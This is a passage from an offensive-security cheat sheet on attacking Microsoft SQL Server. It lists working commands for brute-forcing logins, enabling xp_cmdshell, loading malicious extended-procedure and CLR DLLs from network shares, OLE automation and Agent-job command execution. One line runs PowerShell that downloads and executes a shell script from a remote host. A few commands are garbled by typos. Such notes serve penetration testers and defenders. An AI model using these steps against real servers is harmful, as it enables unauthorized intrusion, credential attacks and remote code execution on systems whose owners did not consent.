    <div class="codehilite"><pre><span></span><span class="k">SELECT</span> <span class="k">distinct</span> <span class="n">b</span><span class="p">.</span><span class="n">name</span> <span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">server_permissions</span> <span class="n">a</span>
<span class="k">INNER</span> <span class="k">JOIN</span> <span class="n">sys</span><span class="p">.</span><span class="n">server_principals</span> <span class="n">b</span> <span class="k">ON</span> <span class="n">a</span><span class="p">.</span><span class="n">grantor_principal_id</span> <span class="o">=</span> <span class="n">b</span><span class="p">.</span><span class="n">principal_id</span>
<span class="k">WHERE</span> <span class="n">a</span><span class="p">.</span><span class="n">permission_name</span> <span class="o">=</span> <span class="s1">&#39;IMPERSONATE&#39;</span>
</pre></div></li>
<li>Find Trustworthy Databases:
    <div class="codehilite"><pre><span></span><span class="k">SELECT</span> <span class="n">name</span> <span class="k">as</span> <span class="n">database_name</span><span class="p">,</span> <span class="n">SUSER_NAME</span><span class="p">(</span><span class="n">owner_sid</span><span class="p">)</span> <span class="k">AS</span> <span class="n">database_owner</span><span class="p">,</span> <span class="n">is_trustworthy_on</span> <span class="k">AS</span> <span class="n">TRUSTWORTHY</span>
<span class="k">from</span> <span class="n">sys</span><span class="p">.</span><span class="n">databases</span>
</pre></div></li>
<li><a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-database-role-members-transact-sql">https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-database-role-members-transact-sql</a></li>
</ul>
<h2 id="brute-forcing">Brute-forcing<a class="headerlink" href="#brute-forcing" title="Permanent link">&para;</a></h2>
<ul>
<li>Check if current domain user has access to DB
    <div class="codehilite"><pre><span></span><span class="nb">Get-SQLInstanceDomain</span> <span class="p">|</span> <span class="nb">Get-SQLConnectionTestThreaded</span> <span class="n">-Verbose</span>
</pre></div></li>
<li>Check if another domain user has access to DB
    <div class="codehilite"><pre><span></span><span class="n">runas</span> <span class="p">/</span><span class="n">noprofile</span> <span class="p">/</span><span class="n">netonly</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="p">&lt;</span><span class="n">domain</span><span class="p">\</span><span class="n">username</span><span class="p">&gt;</span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span>
<span class="nb">Get-SQLInstanceDomain</span> <span class="p">|</span> <span class="nb">Get-SQLConnectionTestThreaded</span> <span class="n">-Verbose</span>
</pre></div></li>
<li>Fuzzing logins:
    <div class="codehilite"><pre><span></span><span class="nb">Get-SQLFuzzServerLogin</span> <span class="n">-Instance</span> <span class="n">ops-mssql</span> <span class="err">–</span><span class="n">Verbose</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="c1">-- Above is equivalent to:</span>
<span class="k">SELECT</span> <span class="n">SUER_NAME</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="k">SELECT</span> <span class="n">SUER_NAME</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="k">SELECT</span> <span class="n">SUER_NAME</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
</pre></div></li>
<li>BruteForce:
    <div class="codehilite"><pre><span></span><span class="nb">Get-SQLInstanceDomain</span> <span class="p">|</span> <span class="n">G</span><span class="p">)</span><span class="n">et-SQLConnectionTestThreaded</span> <span class="n">-Username</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">Password</span> <span class="n">-Verbose</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="nv">$comps</span> <span class="p">=</span> <span class="p">$(</span><span class="nb">Get-SQLInstanceDomain</span><span class="p">).</span><span class="n">ComputerName</span>
<span class="n">comps</span> <span class="p">|</span> <span class="nb">Invoke-BruteForce</span> <span class="n">-UserList</span> <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">dict</span><span class="p">\</span><span class="n">users</span><span class="p">.</span><span class="n">txt</span> <span class="n">-PasswordList</span> <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">dict</span><span class="p">\</span><span class="n">passwords</span><span class="p">.</span><span class="n">txt</span> <span class="n">-Service</span> <span class="n">SQL</span> <span class="err">–</span><span class="n">Verbose</span>
</pre></div></li>
</ul>
<h2 id="command-execution">Command Execution<a class="headerlink" href="#command-execution" title="Permanent link">&para;</a></h2>
<h3 id="xp_cmdshell">xp_cmdshell<a class="headerlink" href="#xp_cmdshell" title="Permanent link">&para;</a></h3>
<ul>
<li>Disabled by default since SQL Server 2005</li>
<li>Executed with the privileges of SQL Server service account</li>
<li>Synchronous</li>
<li><code class="codehilite"><span class="n">sysadmin</span></code> privileges are required</li>
<li>If uninstalled: <code class="codehilite"><span class="n">sp_addextendedproc</span> <span class="s1">&#39;xp_cmdshell&#39;</span><span class="p">,</span><span class="s1">&#39;xplog70.dll&#39;</span></code></li>
<li>Execute command: <ul>
<li><code class="codehilite"><span class="k">EXEC</span> <span class="nv">master</span>..<span class="nv">xp_cmdshell</span> <span class="s1">&#39;</span><span class="s">whoami</span><span class="s1">&#39;</span></code></li>
<li><code class="codehilite"><span class="n">xp_cmdshell</span> <span class="n">powershell</span> <span class="n">iex</span><span class="p">(</span><span class="k">New</span><span class="o">-</span><span class="k">Object</span> <span class="k">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="err">\</span><span class="ss">&quot;http://10.10.14.8/shell.ps1\&quot;</span><span class="p">)</span></code></li>
</ul>
</li>
<li>Enable xp_cmdshell: <code class="codehilite"><span class="n">mssqlclient</span><span class="p">.</span><span class="n">py</span></code> has <code class="codehilite"><span class="n">enable_xp_cmdshell</span></code>
    <div class="codehilite"><pre><span></span><span class="k">exec</span> <span class="n">sp_configure</span> <span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span> <span class="mi">1</span>
<span class="n">RECONFIGURE</span>
<span class="k">exec</span> <span class="n">sp_configure</span> <span class="s1">&#39;xp_cmdshell&#39;</span><span class="p">,</span> <span class="mi">1</span>
<span class="n">RECONFIGURE</span>
</pre></div></li>
<li>Disable xp_cmdshell
    <div class="codehilite"><pre><span></span><span class="k">exec</span> <span class="n">sp_configure</span> <span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span>
<span class="n">RECONFIGURE</span>
<span class="k">exec</span> <span class="n">sp_configure</span> <span class="s1">&#39;xp_cmdshell&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span>
<span class="n">RECONFIGURE</span>
</pre></div></li>
<li>Grant permissions to xp_cmdshell - Let's say we have a user that is not a sysadmin, but is a user of the master database and we nt to grant access to run xp_cmdshell:
    <div class="codehilite"><pre><span></span><span class="c1">-- add user test to the master database</span>
<span class="n">USE</span> <span class="p">[</span><span class="n">master</span><span class="p">]</span>
<span class="k">GO</span>
<span class="k">CREATE</span> <span class="k">USER</span> <span class="p">[</span><span class="n">test</span><span class="p">]</span> <span class="k">FOR</span> <span class="n">LOGIN</span> <span class="p">[</span><span class="n">test</span><span class="p">]</span>
<span class="k">GO</span>
<span class="c1">-- grant execute access to xp_cmdshell</span>
<span class="k">GRANT</span> <span class="k">EXEC</span> <span class="k">ON</span> <span class="n">xp_cmdshell</span> <span class="k">TO</span> <span class="p">[</span><span class="n">test</span><span class="p">]</span>
</pre></div></li>
<li>Nishang: <code class="codehilite"><span class="k">Execute</span><span class="o">-</span><span class="n">Command</span><span class="o">-</span><span class="n">MSSQL</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="n">instance</span> <span class="o">-</span><span class="n">UserName</span> <span class="n">sa</span> <span class="o">-</span><span class="n">Password</span> <span class="n">pw</span></code></li>
<li>PowerUpSQL: <code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">SQLOSCmd</span> <span class="o">-</span><span class="n">Username</span> <span class="n">sa</span> <span class="o">-</span><span class="n">Password</span> <span class="n">pw</span> <span class="o">-</span><span class="n">Instance</span> <span class="n">instance</span> <span class="o">-</span><span class="n">Command</span> <span class="n">whoami</span></code></li>
</ul>
<h3 id="custom-extended-stored-procedures">Custom Extended Stored Procedures<a class="headerlink" href="#custom-extended-stored-procedures" title="Permanent link">&para;</a></h3>
<ul>
<li>DLL which acts as an extension to SQL server</li>
<li><code class="codehilite"><span class="n">sysadmin</span></code> privileges are required to register</li>
<li>Executes with the privileges of the service account</li>
<li>DLL can have any file extension</li>
<li>Can also be loaded from UNC path or Webdav</li>
<li>Sample DLL Code:<ul>
<li><a href="https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp">https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp</a></li>
<li><a href="https://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-custom-sql-server-extended-stored-procedure">https://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-custom-sql-server-extended-stored-procedure</a></li>
</ul>
</li>
<li>If <code class="codehilite"><span class="n">xp_calc</span><span class="p">.</span><span class="n">dll</span></code> has a function called <code class="codehilite"><span class="n">xp_calc</span></code>:\
    <div class="codehilite"><pre><span></span><span class="n">sp_addextendedproc</span> <span class="s1">&#39;xp_calc&#39;</span><span class="p">,</span> <span class="s1">&#39;C:\mydll\xp_calc.dll&#39;</span>
<span class="k">EXEC</span> <span class="n">xp_calc</span>
<span class="n">sp_dropextendedproc</span> <span class="s1">&#39;xp_calc&#39;</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="n">Create-SQLFileXpDll</span> <span class="n">-OutFile</span> <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">fileserver</span><span class="p">\</span><span class="n">xp_calc</span><span class="p">.</span><span class="n">dll</span> <span class="n">-Command</span> <span class="s2">&quot;calc.exe&quot;</span> <span class="n">-ExportName</span> <span class="n">xp_calc</span>
<span class="nb">Get-SQLQuery</span> <span class="n">-UserName</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">pw</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-Query</span> <span class="s2">&quot;sp_addextendedproc &#39;xp_calc&#39;, &#39;\\192.168.15.2\fileserver\xp_calc.dll&#39;&quot;</span>
<span class="nb">Get-SQLQuery</span> <span class="n">-UserName</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">Password1</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-Query</span> <span class="s2">&quot;EXEC xp_calc&quot;</span>
</pre></div></li>
<li>Listing existing Custom Extended Stored Procedures:
    <div class="codehilite"><pre><span></span><span class="nb">Get-SQLStoredProcedureXP</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-Verbose</span>
</pre></div></li>
</ul>
<h3 id="custom-clr-assemblies">Custom CLR Assemblies<a class="headerlink" href="#custom-clr-assemblies" title="Permanent link">&para;</a></h3>
<ul>
<li>CLR (<code class="codehilite"><span class="n">Common</span> <span class="k">Language</span> <span class="n">Runtime</span></code>) is a run-time environment provided by the <code class="codehilite"><span class="na">.NET</span> <span class="no">framework</span></code></li>
<li>SQL Server CLR integration allows writing stored procedures and other things by importing a DLL.</li>
<li>CLR integration is off by default</li>
<li><code class="codehilite"><span class="n">sysadmin</span></code> privileges are required by-default.</li>
<li>Create assembly, alter assembly or <code class="codehilite"><span class="n">DDL_Admin</span></code> role can also use it.</li>
<li>Execution takes place with privileges of the service account</li>
<li>DLL can be loaded from a local path or a UNC path</li>
<li>References<ul>
<li><a href="https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integrationv">https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integrationv</a></li>
<li><a href="https://blog.netspi.com/attacking-sql-server-clr-assemblies/">https://blog.netspi.com/attacking-sql-server-clr-assemblies/</a></li>
</ul>
</li>
<li>Enable CLR:
    <div class="codehilite"><pre><span></span><span class="n">use</span> <span class="n">msdb</span>
<span class="k">GO</span>
<span class="c1">-- Enable show advanced options on the server</span>
<span class="n">sp_configure</span> <span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span><span class="mi">1</span>
<span class="n">RECONFIGURE</span>
<span class="k">GO</span>
<span class="c1">-- Enable clr on the server</span>
<span class="n">sp_configure</span> <span class="s1">&#39;clr enabled&#39;</span><span class="p">,</span><span class="mi">1</span>
<span class="n">RECONFIGURE</span>
<span class="k">GO</span>
</pre></div></li>
<li>Create DLL:
    <div class="codehilite"><pre><span></span><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">NET</span><span class="err">\</span><span class="n">Framework64</span><span class="err">\</span><span class="n">v4</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">30319</span><span class="err">\</span><span class="n">csc</span><span class="p">.</span><span class="n">exe</span> <span class="o">/</span><span class="n">target</span><span class="p">:</span><span class="n">library</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">labuser</span><span class="err">\</span><span class="n">Desktop</span><span class="err">\</span><span class="n">cmd_exec</span><span class="p">.</span><span class="n">cs</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="n">Create-SQLFileCLRDll</span> <span class="n">-ProcedureName</span> <span class="s2">&quot;runcmd&quot;</span> <span class="n">-OutFile</span> <span class="n">runcmd</span> <span class="n">-OutDir</span> <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">labuser</span><span class="p">\</span><span class="n">Desktop</span>
</pre></div></li>
<li>Import the assembly from file:
    <div class="codehilite"><pre><span></span><span class="k">CREATE</span> <span class="n">ASSEMBLY</span> <span class="n">my_assembly</span> <span class="k">FROM</span> <span class="s1">&#39;\\192.168.15.2\fileserver\cmd_exec.dll&#39;</span> <span class="k">WITH</span> <span class="n">PERMISSION_SET</span> <span class="o">=</span> <span class="n">UNSAFE</span><span class="p">;</span>
<span class="k">GO</span>
</pre></div></li>
<li>Import the assembly from string:
    <div class="codehilite"><pre><span></span><span class="k">CREATE</span> <span class="n">ASSEMBLY</span> <span class="p">[</span><span class="n">NMfsa</span><span class="p">]</span> <span class="k">AUTHORIZATION</span> <span class="p">[</span><span class="n">dbo</span><span class="p">]</span> <span class="k">FROM</span> <span class="mi">0</span><span class="n">x4D5A90</span><span class="p">......</span>
</pre></div></li>
<li>Link the assembly to a stored procedure
    <div class="codehilite"><pre><span></span><span class="k">CREATE</span> <span class="k">PROCEDURE</span> <span class="p">[</span><span class="n">dbo</span><span class="p">].[</span><span class="n">cmd_exec</span><span class="p">]</span> <span class="o">@</span><span class="n">execCommand</span> <span class="n">NVARCHAR</span> <span class="p">(</span><span class="mi">4000</span><span class="p">)</span> <span class="k">AS</span> <span class="k">EXTERNAL</span> <span class="n">NAME</span> <span class="p">[</span><span class="n">my_assembly</span><span class="p">].[</span><span class="n">StoredProcedures</span><span class="p">].[</span><span class="n">cmd_exec</span><span class="p">];</span>
<span class="k">GO</span>
</pre></div></li>
<li>Execution:
    <div class="codehilite"><pre><span></span><span class="n">cmd_exec</span> <span class="s1">&#39;whoami&#39;</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="nb">Invoke-SQLOSCmdCLR</span> <span class="n">-Username</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">pw</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-Command</span> <span class="s2">&quot;whoami&quot;</span> <span class="n">-Verbose</span>
</pre></div></li>
<li>Cleanup:
    <div class="codehilite"><pre><span></span><span class="k">DROP</span> <span class="k">PROCEDURE</span> <span class="n">cmd_exec</span>
<span class="k">DROP</span> <span class="n">ASSEMBLY</span> <span class="n">my_assembly</span>
</pre></div></li>
<li>List all CLR assemblies:
    <div class="codehilite"><pre><span></span><span class="nb">Get-SQLStoredProcedureCLR</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-Verbose</span>
</pre></div></li>
</ul>
<h3 id="ole-automation-procedure">OLE Automation Procedure<a class="headerlink" href="#ole-automation-procedure" title="Permanent link">&para;</a></h3>
<ul>
<li>Disabled by default</li>
<li><code class="codehilite"><span class="n">sysadmin</span></code> privileges are required by-default.</li>
<li>Execution takes place with privileges of the service account</li>
<li>Execute privileges on <code class="codehilite"><span class="n">sp_OACreate</span></code> and <code class="codehilite"><span class="n">sp_OAMethod</span></code> can also be used for execution.</li>
<li>References:<ul>
<li><a href="https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option">https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option</a></li>
</ul>
</li>
<li>Enabling:
    <div class="codehilite"><pre><span></span><span class="n">sp_configure</span> <span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">;</span>
<span class="k">GO</span>
<span class="n">RECONFIGURE</span><span class="p">;</span>
<span class="k">GO</span>
<span class="n">sp_configure</span> <span class="s1">&#39;Ole Automation Procedures&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">;</span>
<span class="k">GO</span>
<span class="n">RECONFIGURE</span><span class="p">;</span>
<span class="k">GO</span>
</pre></div></li>
<li>Execute:
    <div class="codehilite"><pre><span></span><span class="k">DECLARE</span> <span class="o">@</span><span class="k">output</span> <span class="nb">INT</span>
<span class="k">DECLARE</span> <span class="o">@</span><span class="n">ProgramToRun</span> <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span>
<span class="k">SET</span> <span class="o">@</span><span class="n">ProgramToRun</span> <span class="o">=</span> <span class="s1">&#39;Run(&quot;calc.exe&quot;)&#39;</span>
<span class="k">EXEC</span> <span class="n">sp_oacreate</span> <span class="s1">&#39;wScript.Shell&#39;</span><span class="p">,</span> <span class="o">@</span><span class="k">output</span> <span class="k">out</span>
<span class="k">EXEC</span> <span class="n">sp_oamethod</span> <span class="o">@</span><span class="k">output</span><span class="p">,</span> <span class="o">@</span><span class="n">ProgramToRun</span>
<span class="k">EXEC</span> <span class="n">sp_oadestroy</span> <span class="o">@</span><span class="k">output</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="nb">Invoke-SQLOSCmdCLR</span> <span class="n">-Username</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">pw</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-Command</span> <span class="s2">&quot;whoami&quot;</span> <span class="n">-Verbose</span>
</pre></div></li>
<li>Example: Sets SecurityDescriptor of ftp.exe to everyone:<ul>
<li><a href="https://malwaremusings.com/2013/04/10/a-look-at-some-ms-sql-attacks-overview/">https://malwaremusings.com/2013/04/10/a-look-at-some-ms-sql-attacks-overview/</a>
  <div class="codehilite"><pre><span></span><span class="c1">-- Declare variables used to reference the objects</span>
<span class="k">DECLARE</span> <span class="o">@</span><span class="n">objLocator</span> <span class="nb">int</span><span class="p">,</span><span class="o">@</span><span class="n">objWmi</span> <span class="nb">int</span><span class="p">,</span><span class="o">@</span><span class="n">objPermiss</span> <span class="nb">int</span><span class="p">,</span><span class="o">@</span><span class="n">objFull</span> <span class="nb">int</span><span class="p">;</span>

<span class="c1">-- Create a WbemScripting.SWbemLocator object</span>
<span class="k">EXEC</span> <span class="n">sp_OACreate</span> <span class="s1">&#39;WbemScripting.SWbemLocator&#39;</span><span class="p">,</span><span class="o">@</span><span class="n">objLocator</span> <span class="k">OUTPUT</span><span class="p">;</span>

<span class="c1">-- Use the SWbemLocator object&#39;s ConnectServer() method to connect to the</span>
<span class="c1">-- local WMI server. The connection will be to the &#39;root\cimv2&#39; namespace</span>
<span class="k">EXEC</span> <span class="n">sp_OAMethod</span> <span class="o">@</span><span class="n">objLocator</span><span class="p">,</span>
<span class="s1">&#39;ConnectServer&#39;</span><span class="p">,</span><span class="o">@</span><span class="n">objWmi</span> <span class="k">OUTPUT</span><span class="p">,</span><span class="s1">&#39;.&#39;</span><span class="p">,</span><span class="s1">&#39;root\cimv2&#39;</span><span class="p">;</span>

<span class="c1">-- Retrieve an SWbemObject that represents the requested object</span>
<span class="c1">-- In this case, a Win32_LogicalFileSecuritySetting object for &#39;ftp.exe&#39;</span>
<span class="k">EXEC</span> <span class="n">sp_OAMethod</span> <span class="o">@</span><span class="n">objWmi</span><span class="p">,</span>
<span class="s1">&#39;Get&#39;</span><span class="p">,</span><span class="o">@</span><span class="n">objPermiss</span> <span class="k">OUTPUT</span><span class="p">,</span>
<span class="s1">&#39;Win32_LogicalFileSecuritySetting.Path=&#39;&#39;ftp.exe&#39;&#39;&#39;</span><span class="p">;</span>

<span class="c1">-- Create an empty SecurityDescriptor</span>
<span class="k">EXEC</span> <span class="n">sp_OAMethod</span> <span class="o">@</span><span class="n">objWmi</span><span class="p">,</span><span class="s1">&#39;Get&#39;</span><span class="p">,</span><span class="o">@</span><span class="n">objFull</span>
<span class="k">OUTPUT</span><span class="p">,</span><span class="s1">&#39;Win32_SecurityDescriptor&#39;</span><span class="p">;</span>

<span class="c1">-- Set the SecurityDescriptor&#39;s ControlFlags property to</span>
<span class="c1">-- &#39;4&#39; (SE_DACL_PRESENT)</span>
<span class="k">EXEC</span> <span class="n">sp_OASetProperty</span> <span class="o">@</span><span class="n">objFull</span><span class="p">,</span><span class="s1">&#39;ControlFlags&#39;</span><span class="p">,</span><span class="mi">4</span><span class="p">;</span>
<span class="c1">-- Set the file security setting object&#39;s security descriptor to the</span>
<span class="k">new</span>

<span class="c1">-- SecurityDescriptor object</span>
<span class="k">EXEC</span> <span class="n">sp_OAMethod</span> <span class="o">@</span><span class="n">objPermiss</span><span class="p">,</span><span class="s1">&#39;SetSecurityDescriptor&#39;</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="o">@</span><span class="n">objFull</span><span class="p">;</span>
</pre></div></li>
</ul>
</li>
</ul>
<h3 id="agent-jobs-cmdexec-powershell-activex-etc">Agent Jobs (CmdExec, PowerShell, ActiveX etc.)<a class="headerlink" href="#agent-jobs-cmdexec-powershell-activex-etc" title="Permanent link">&para;</a></h3>
<ul>
<li>Job can be scheduled, executed in response to alerts or by using <code class="codehilite"><span class="n">sp_start_job</span></code> stored procedure</li>
<li>Needs <code class="codehilite"><span class="n">sysadmin</span></code> role to <code class="codehilite"><span class="k">create</span></code> a job.</li>
<li>Non-sysadmin users with the <code class="codehilite"><span class="n">SQLAgentUserRole</span></code>, <code class="codehilite"><span class="n">SQLAgentReaderRole</span></code>, and <code class="codehilite"><span class="n">SQLAgentOperatorRole</span></code> fixed database roles in the <code class="codehilite"><span class="n">msdb</span></code> database can also be used.</li>
<li>The execution takes place with privileges of the SQL Server Agent service account if a proxy account is not configured.</li>
<li>References:<ul>
<li><a href="https://docs.microsoft.com/en-us/sql/ssms/agent/sql-server-agent">https://docs.microsoft.com/en-us/sql/ssms/agent/sql-server-agent</a></li>
<li><a href="https://serverfault.com/a/14569">https://serverfault.com/a/14569</a></li>
<li><a href="https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution">https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution</a></li>
</ul>
</li>
<li>Steps<ul>
<li><code class="codehilite"><span class="n">xp_startservice</span></code> - Start the SQL Server Agent service</li>
<li><code class="codehilite"><span class="n">sp_add_job</span></code> - Create Job</li>
<li><code class="codehilite"><span class="n">sp_add_jobstep</span></code> - Add job step</li>
<li><code class="codehilite"><span class="n">sp_start_job</span></code> - Run Job</li>
<li><code class="codehilite"><span class="n">sp_delete_job</span></code> - Delete Job</li>
</ul>
</li>
<li>Listing all Jobs**
    <div class="codehilite"><pre><span></span><span class="k">SELECT</span>
<span class="n">job</span><span class="p">.</span><span class="n">job_id</span><span class="p">,</span> <span class="n">notify_level_email</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">enabled</span><span class="p">,</span>
<span class="n">description</span><span class="p">,</span> <span class="n">step_name</span><span class="p">,</span> <span class="n">command</span><span class="p">,</span> <span class="n">server</span><span class="p">,</span> <span class="n">database_name</span>
<span class="k">FROM</span>
<span class="n">msdb</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">sysjobs</span> <span class="n">job</span>
<span class="k">INNER</span> <span class="k">JOIN</span>
<span class="n">msdb</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">sysjobsteps</span> <span class="n">steps</span>
<span class="k">ON</span>
<span class="n">job</span><span class="p">.</span><span class="n">job_id</span> <span class="o">=</span> <span class="n">steps</span><span class="p">.</span><span class="n">job_id</span>
</pre></div></li>
<li>Interesting subsystems (job types):<ul>
<li>PowerShell
  <div class="codehilite"><pre><span></span><span class="n">USE</span> <span class="n">msdb</span>
<span class="k">EXEC</span> <span class="n">dbo</span><span class="p">.</span><span class="n">sp_add_job</span> <span class="o">@</span><span class="n">job_name</span> <span class="o">=</span> <span class="n">N</span><span class="s1">&#39;PSJob&#39;</span>

<span class="k">EXEC</span> <span class="n">sp_add_jobstep</span> <span class="o">@</span><span class="n">job_name</span> <span class="o">=</span> <span class="n">N</span><span class="s1">&#39;PSJob&#39;</span><span class="p">,</span> <span class="o">@</span><span class="n">step_name</span> <span class="o">=</span>
<span class="n">N</span><span class="s1">&#39;test_powershell_name1&#39;</span><span class="p">,</span> <span class="o">@</span><span class="n">subsystem</span> <span class="o">=</span> <span class="n">N</span><span class="s1">&#39;PowerShell&#39;</span><span class="p">,</span> <span class="o">@</span><span class="n">command</span> <span class="o">=</span> <span class="n">N</span><span class="s1">&#39;powershell.exe -noexit ps&#39;</span><span class="p">,</span> <span class="o">@</span><span class="n">retry_attempts</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="o">@</span><span class="n">retry_interval</span> <span class="o">=</span> <span class="mi">5</span>

<span class="k">EXEC</span> <span class="n">dbo</span><span class="p">.</span><span class="n">sp_add_jobserver</span> <span class="o">@</span><span class="n">job_name</span> <span class="o">=</span> <span class="n">N</span><span class="s1">&#39;PSJob&#39;</span>

<span class="k">EXEC</span> <span class="n">dbo</span><span class="p">.</span><span class="n">sp_start_job</span> <span class="n">N</span><span class="s1">&#39;PSJob&#39;</span>
<span class="c1">-- EXEC dbo.sp_delete_job @job_name = N&#39;PSJob&#39;</span>
</pre></div></li>
<li>CmdExec
  <div class="codehilite"><pre><span></span><span class="n">USE</span> <span class="n">msdb</span>
<span class="k">EXEC</span> <span class="n">dbo</span><span class="p">.</span><span class="n">sp_add_job</span> <span class="o">@</span><span class="n">job_name</span> <span class="o">=</span> <span class="n">N</span><span class="s1">&#39;cmdjob&#39;</span>

<span class="k">EXEC</span> <span class="n">sp_add_jobstep</span> <span class="o">@</span><span class="n">job_name</span> <span class="o">=</span> <span class="n">N</span><span class="s1">&#39;cmdjob&#39;</span><span class="p">,</span> <span class="o">@</span><span class="n">step_name</span> <span class="o">=</span> <span class="n">N</span><span class="s1">&#39;test_cmd_name1&#39;</span><span class="p">,</span> <span class="o">@</span><span class="n">subsystem</span> <span class="o">=</span> <span class="n">N</span><span class="s1">&#39;cmdexec&#39;</span><span class="p">,</span> <span class="o">@</span><span class="n">command</span> <span class="o">=</span> <span class="n">N</span><span class="s1">&#39;cmd.exe /k calc&#39;</span><span class="p">,</span> <span class="o">@</span><span class="n">retry_attempts</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="o">@</span><span class="n">retry_interval</span> <span class="o">=</span> <span class="mi">5</span>

<span class="k">EXEC</span> <span class="n">dbo</span><span class="p">.</span><span class="n">sp_add_jobserver</span> <span class="o">@</span><span class="n">job_name</span> <span class="o">=</span> <span class="n">N</span><span class="s1">&#39;cmdjob&#39;</span>

<span class="k">EXEC</span> <span class="n">dbo</span><span class="p">.</span><span class="n">sp_start_job</span> <span class="n">N</span><span class="s1">&#39;cmdjob&#39;</span><span class="p">;</span>
<span class="c1">-- EXEC dbo.sp_delete_job @job_name = N&#39;cmdJob&#39;</span>
</pre></div></li>
<li>Microsoft ActiveX Script (VBScript and Jscript)</li>
<li>SSIS (SQL Server Integrated Services)</li>
</ul>
</li>
<li>PowerUpSQL
    <div class="codehilite"><pre><span></span><span class="nb">Invoke-SQLOSCmdAgentJob</span> <span class="err">–</span><span class="n">Subsystem</span> <span class="n">PowerShell</span> <span class="n">-Username</span>
<span class="n">sa</span> <span class="n">-Password</span> <span class="n">pw</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-Command</span>
<span class="s2">&quot;powershell -e &lt;base64encodedscript&gt;&quot;</span> <span class="n">-Verbose</span>
<span class="n">-Subsystem</span> <span class="n">CmdExec</span>
<span class="n">-ubsystem</span> <span class="n">VBScript</span>
<span class="n">-Subsystem</span> <span class="n">Jscript</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="nb">Get-SQLAgentJob</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-username</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">pw</span> <span class="n">-Verboe</span><span class="p">]</span><span class="n">se</span>
</pre></div></li>
</ul>
<h3 id="external-scripting">External Scripting<a class="headerlink" href="#external-scripting" title="Permanent link">&para;</a></h3>
<ul>
<li>R introduced in SQL Server 2016</li>
<li>Python introduced in SQL Server 2017</li>
<li>Runtime environments must be installed as a prerequisite. Not on by default. Needs SQL server service restart.</li>
<li>Needs <code class="codehilite"><span class="n">sysadmin</span></code> privileges to be enabled and executed.</li>
<li>Runs with privileges of a dynamically created Windows user account (member of the <code class="codehilite"><span class="n">SQLRUserGroup</span></code>).</li>
<li>References:<ul>
